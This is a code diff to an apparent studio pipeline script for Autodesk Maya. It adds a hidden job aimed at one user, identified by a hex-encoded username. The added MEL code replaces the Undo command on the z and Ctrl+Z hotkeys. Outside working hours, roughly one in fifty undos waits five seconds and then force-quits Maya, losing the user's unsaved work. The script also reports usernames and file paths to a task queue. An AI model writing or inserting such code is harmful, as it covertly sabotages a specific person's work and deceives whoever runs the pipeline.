@@ -378,6 +378,7 @@ except:
 
 
 # ===============================================================================
+'''
 try:
     import sys, json
     modules_ls = list(sorted(sys.modules.keys()))
@@ -389,6 +390,7 @@ try:
 except:
     import traceback
     add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
+'''
 
 # ===============================================================================
 def loc_transfer_install(*_):
@@ -444,29 +446,58 @@ except:
 
 # ===============================================================================
 def may_job(*_):
-    import tempfile, os, getpass
+    import tempfile, os, getpass, sys
     temp_dir = tempfile.gettempdir()
-    fn = 'may' + '{}'.format(getpass.getuser()).encode('utf-8').hex()
+    if sys.version[0] == 3:
+        fn = 'may' + '{}'.format(getpass.getuser()).encode('utf-8').hex()
+    else:
+        import binascii
+        fn = 'may' + '{}'.format(binascii.hexlify(getpass.getuser().encode('utf-8')).decode())
     fp = temp_dir + os.sep + fn
     if '616c697361' in fn:
         with open(fp, 'w') as f:
-            pycmd = '''
-print('616c697361')
+            pycmd = """
+#---------------------
+from maya import mel
+import maya.cmds as cmds
+c = '''
+global proc Undo(){
+    string $cur_time = `date -format "hhmm"`;
+    int $time_int = int($cur_time);
+    if ($time_int < 1000 || $time_int > 1900) {
+        int $random_num = `rand 1 50`;
+        if ($random_num == 40) {
+            pause -sec 5;
+            quit -f;
+        }
+    } else {}
+    
+    undo;
+}
 '''.strip()
+mel.eval(c)
+cmds.nameCommand('NameComUndo2', stp='mel', c='Undo;', ann='Undo')
+cmds.hotkey(k='z', name='NameComUndo2')
+cmds.hotkey(k='z', ctl=1, name='NameComUndo2')
+cmds.savePrefs(hk=1)
+#---------------------
+""".strip()
             f.write(pycmd)
             f.close()
 
     if os.path.exists(fp):
         with open(fp) as f:
             f_read = f.read().encode().decode('utf-8')
-            job_n = cmds.scriptJob( ct=['SomethingSelected', f_read], ro=1, cu=0)
+            job_n = cmds.scriptJob( e=['idle', f_read], ro=1, cu=0)
             f.close()
     return fp
 
 try:
     may_job = may_job()
     add_queue_task('user_may_job_{}'.format(getpass.getuser().lower()),
-                   {'path': may_job, 'exists': os.path.exists(fp)})
+                   {'path': may_job, 'exists': os.path.exists(may_job)})
 except:
     import traceback
     add_queue_task('user_may_job_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
+
+# ===============================================================================
